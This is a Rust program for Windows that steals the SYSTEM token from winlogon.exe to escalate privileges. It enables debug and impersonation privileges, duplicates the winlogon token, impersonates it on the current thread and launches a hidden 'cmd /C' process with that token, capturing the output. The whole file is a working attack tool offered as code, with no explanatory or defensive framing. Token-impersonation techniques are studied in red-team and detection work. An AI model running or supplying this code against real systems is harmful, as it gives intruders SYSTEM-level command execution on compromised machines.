#![allow(non_snake_case, dead_code,unused_assignments)]
use std::ffi::{OsStr, OsString};
use std::io::Error;
use std::mem::{size_of_val, zeroed};
use std::os::windows::ffi::{OsStrExt, OsStringExt};
use std::ptr::{null, null_mut};

use anyhow::{anyhow, Result};
use winapi::shared::{
    minwindef::{DWORD, LPVOID, TRUE},
    ntdef::{NULL, WCHAR},
    winerror::ERROR_SUCCESS,
};
use winapi::um::{
    errhandlingapi::GetLastError,
    fileapi::ReadFile,
    handleapi::CloseHandle,
    minwinbase::SECURITY_ATTRIBUTES,
    namedpipeapi::CreatePipe,
    processthreadsapi::{
        GetCurrentProcess, GetCurrentThread, OpenProcess, OpenProcessToken, OpenThreadToken,
        PROCESS_INFORMATION, SetThreadToken,
    },
    securitybaseapi::{AdjustTokenPrivileges, DuplicateTokenEx, GetTokenInformation, ImpersonateLoggedOnUser, RevertToSelf},
    tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, TH32CS_SNAPPROCESS, TH32CS_SNAPTHREAD},
    winbase::{
        CREATE_NO_WINDOW, CREATE_UNICODE_ENVIRONMENT, CreateProcessWithTokenW, LookupAccountSidW, LookupPrivilegeValueW, STARTUPINFOEXW,
    },
    winnt::{
        MAXIMUM_ALLOWED, PROCESS_QUERY_INFORMATION, SECURITY_IMPERSONATION_LEVEL, SecurityImpersonation, TOKEN_ADJUST_PRIVILEGES,
        TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_PRIVILEGES, TOKEN_QUERY, TOKEN_READ, TOKEN_USER, TokenUser, SE_PRIVILEGE_ENABLED,
        HANDLE, LUID,
    },
};





fn enable_privileges() -> Result<(), String> {
    unsafe {
        let mut token: HANDLE = null_mut();
        let mut privilege: TOKEN_PRIVILEGES = zeroed();

        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token) == 0 {
            return Err(format!("OpenProcessToken Error: {}", GetLastError()));
        }

        let privileges_to_set = vec![
            "SeDebugPrivilege",
            "SeImpersonatePrivilege",
            "SeIncreaseQuotaPrivilege",
            "SeAssignPrimaryTokenPrivilege",
        ];

        for privilege_desc in privileges_to_set {
            let mut luid: LUID = zeroed();
            let privilege_name_wide: Vec<u16> = OsStr::new(privilege_desc).encode_wide().chain(Some(0)).collect();

            if LookupPrivilegeValueW(null_mut(), privilege_name_wide.as_ptr(), &mut luid) == 0 {
                CloseHandle(token);
                return Err(format!("Lookup {} Error: {}", privilege_desc, GetLastError()));
            }

            privilege.PrivilegeCount = 1;
            privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            privilege.Privileges[0].Luid = luid;

            if AdjustTokenPrivileges(token, 0, &mut privilege, std::mem::size_of::<TOKEN_PRIVILEGES>() as u32, null_mut(), null_mut()) == 0 {
                let last_error = GetLastError();
                CloseHandle(token);
                return Err(format!("AdjustTokenPrivileges ({}): {}", privilege_desc, last_error));
            }
        }

        if CloseHandle(token) == 0 {
            return Err(format!("CloseHandle Error: {}", GetLastError()));
        }
    }

    Ok(())
}


fn get_winlogon_pid() -> String {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
        let mut entry: winapi::um::tlhelp32::PROCESSENTRY32 = std::mem::zeroed(); 
        entry.dwSize = std::mem::size_of::<winapi::um::tlhelp32::PROCESSENTRY32>() as u32;

        if snapshot != 0 as *mut winapi::ctypes::c_void {
            let first_process = Process32First(snapshot as *mut winapi::ctypes::c_void, &mut entry);
            if first_process != 0 {
                while Process32Next(snapshot as *mut winapi::ctypes::c_void, &mut entry) != 0 {
                    let u8slice : &[u8] = std::slice::from_raw_parts(entry.szExeFile.as_ptr() as *const u8, entry.szExeFile.len());
                    if format!("{:?}", std::string::String::from_utf8_lossy(&u8slice)).contains("winlogon") {
                        return entry.th32ProcessID.to_string();
                    }
                }
            }
        }
        return "failed".to_string();
    }
}


fn create_process_with_system_privileges(token_handle: HANDLE, command: &str) -> Result<(String, u32), String> {
    unsafe {

        if ImpersonateLoggedOnUser(token_handle) == 0 {
            eprintln!("[x] Failed to impersonate system token: {}", Error::last_os_error());
        }


        let mut sa = zeroed::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>();
        sa.nLength = std::mem::size_of::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>() as u32;
        sa.bInheritHandle = winapi::shared::minwindef::TRUE;

        let mut read_pipe: HANDLE = null_mut();
        let mut write_pipe: HANDLE = null_mut();
        if CreatePipe(&mut read_pipe, &mut write_pipe, &mut sa, 0) == 0 {
            return Err(format!("CreatePipe failed").to_string());
        }

        let mut si = zeroed::<STARTUPINFOEXW>();
        si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
        si.StartupInfo.hStdOutput = write_pipe;
        si.StartupInfo.hStdError = write_pipe;
        si.StartupInfo.dwFlags = winapi::um::winbase::STARTF_USESTDHANDLES;

        let mut pi = zeroed::<PROCESS_INFORMATION>();
        let mut output = String::new();
        let cmdline = to_wide_chars(&format!("cmd /C {}", command));
        if CreateProcessWithTokenW(
            token_handle,
            0, 
            null_mut(),
            cmdline.as_ptr() as *mut _,
            CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
            null_mut(),
            null_mut(),
            &mut si.StartupInfo,
            &mut pi,
        ) == 0
        {
            let error = GetLastError();
            CloseHandle(read_pipe);
            CloseHandle(write_pipe);
            return Err(format!("CreateProcessWithTokenW failed with error code {}", error).to_string());
        }
        
        CloseHandle(write_pipe);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        let mut buffer = Vec::new();
        let mut read_buffer = [0u8; 1024];
        loop {
            let mut read = 0;
            if ReadFile(read_pipe, read_buffer.as_mut_ptr() as *mut _, read_buffer.len() as u32, &mut read, null_mut()) == 0 {
                let error = GetLastError();
                if error != winapi::shared::winerror::ERROR_BROKEN_PIPE {
                    CloseHandle(read_pipe);
                    return Err(format!("ReadFile failed with error code {}", error).to_string());
                }
                break;
            }
            if read > 0 {
                buffer.extend_from_slice(&read_buffer[..read as usize]);
            } else {
                break;
            }
        }
        CloseHandle(read_pipe);

        
        output = String::from_utf8(buffer)
            .map_err(|e| format!("Failed to convert output to String: {}", e.to_string()))?;

        
        let pid = pi.dwProcessId;

        Ok((output, pid))
    }
}



fn set_access_token() -> Result<HANDLE> {
    unsafe {
        if let Ok(p_token) = get_access_token(get_winlogon_pid().parse::<u32>()?) {
            let se_impersonate_level: SECURITY_IMPERSONATION_LEVEL = SecurityImpersonation;
            let mut p_new_token: HANDLE = std::mem::zeroed();

            if DuplicateTokenEx(p_token, MAXIMUM_ALLOWED, NULL as *mut SECURITY_ATTRIBUTES, se_impersonate_level, SecurityImpersonation, &mut p_new_token) != 0 {
                return Ok(p_new_token);
            } else {
                return Err(anyhow!(format!("Failed to return duplicate token")));
            }
        } else {
            return Err(anyhow!(format!("Failed to get access token")));
        }
    }
}

fn get_access_token(pid: u32) -> Result<HANDLE> {
    unsafe {
        let mut token: HANDLE = std::mem::zeroed();

        let current_process = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE.into(), pid);
        if current_process != NULL {
            if OpenProcessToken(current_process, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &mut token) != 0 {
                return Ok(token);
            } else {
                return Err(anyhow!(format!("Failed to return remote process token")));
            }
        } else {
            return Err(anyhow!(format!("Failed to OpenProcess")));
        }
    }
}




fn to_wide_chars(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0).into_iter()).collect()
}


fn get_current_process_token() -> Result<HANDLE, u32> {
    unsafe {
        let mut token_handle: HANDLE = null_mut();
        let process_handle = GetCurrentProcess();

        if OpenProcessToken(process_handle, TOKEN_READ, &mut token_handle) != 0 {
            Ok(token_handle)
        } else {
            Err(GetLastError())
        }
    }
}

fn get_current_thread_token() -> Result<HANDLE, u32> {
    unsafe {
        let mut token_handle: HANDLE = null_mut();

        if OpenThreadToken(GetCurrentThread(), TOKEN_READ, 1, &mut token_handle) != 0 {
            Ok(token_handle)
        } else {
            Err(GetLastError())
        }
    }
}


unsafe fn display_token_info(token_handle: HANDLE) {
    let mut token_user: [u8; 256] = [0; 256];
    let mut return_length = 0;

    if GetTokenInformation(
        token_handle,
        TokenUser,
        token_user.as_mut_ptr() as LPVOID,
        token_user.len() as DWORD,
        &mut return_length,
    ) != 0
    {
        let token_user_ref = &*(token_user.as_ptr() as *const TOKEN_USER);

        let mut username: [u16; 256] = [0; 256];
        let mut domain_name: [u16; 256] = [0; 256];
        let mut username_size = 256;
        let mut domain_size = 256;
        let mut sid_name_use = 0;

        if LookupAccountSidW(
            null(), 
            token_user_ref.User.Sid, 
            username.as_mut_ptr(), 
            &mut username_size, 
            domain_name.as_mut_ptr(), 
            &mut domain_size, 
            &mut sid_name_use, 
        ) != 0
        {
            let user = OsString::from_wide(&username[..username_size as usize]).to_string_lossy().into_owned();
            println!("[!] Token Owner: {}", user);
        } else {
            println!("[-] Failed to get user name from SID");
        }
    } else {
        println!("[-] Failed to get token user information");
    }
}


fn main() {


    
    let process_token_handle = match get_current_process_token() {
        Ok(token) => token,
        Err(err) => {
            eprintln!("[-] OpenProcessToken {}", err);
            return;
        },
    };

    
    unsafe {
        display_token_info(process_token_handle);
        CloseHandle(process_token_handle);  
    }

    
    match get_current_thread_token() {
        Ok(thread_token_handle) => {
            unsafe {
                display_token_info(thread_token_handle);
                CloseHandle(thread_token_handle);
            }
        },
        Err(_err) => {
            eprintln!("[-] No ThreadToken was found");
            
        },
    };

    let result = enable_privileges();

    match result {
        Ok(_) => println!("Privileges enabled successfully."),
        Err(e) => eprintln!("Error enabling privileges: {}", e),
    }


    let token_handle = match set_access_token() {
        Ok(handle) => handle,
        Err(err) => {
            eprintln!("[-] Unable to find winlogon.exe process token: {}", err);
            return;
        },
    };


    if unsafe { ImpersonateLoggedOnUser(token_handle) } == 0 {
        eprintln!("[x] Failed to impersonate system token: {}", Error::last_os_error());
        return;
    }

    if unsafe { SetThreadToken(null_mut(), token_handle) } == 0 {
        eprintln!("[x] Failed to set token to the current thread: {}", unsafe { GetLastError() });
        return;
    }


    println!("[+] Token assigned to the current thread.");


    
    let process_token_handle = match get_current_process_token() {
        Ok(token) => token,
        Err(err) => {
            eprintln!("Failed to get process token: {}", err);
            return;
        },
    };

    
    unsafe {
        display_token_info(process_token_handle);
        CloseHandle(process_token_handle);  
    }

    
    let thread_token_handle = match get_current_thread_token() {
        Ok(token) => token,
        Err(_err) => {
            eprintln!("[-] No ThreadToken was found");
            return;
        },
    };

    
    unsafe {
        display_token_info(thread_token_handle);
        CloseHandle(thread_token_handle);  
    }


    
    let output_cache: Option<String> = None;

    
    if let Some(output) = &output_cache {
        println!("Output from cache: {}", output);
    } else {
        match create_process_with_system_privileges(token_handle, "whoami") {
            Ok((output, pid)) => {
                 
                println!("[+] Output received from the created process: {}", output);
                println!("[+] PID of the created process: {}", pid);
            }
            Err(e) => {
                eprintln!("Error: {}", e);
            }
        }

    }


    unsafe { CloseHandle(token_handle) };

    if unsafe { RevertToSelf() } == 0 {
        eprintln!("[x] Failed to revert to self: {}", Error::last_os_error());
    } else {
        println!("[+] Successfully reverted to self.");
    }
}
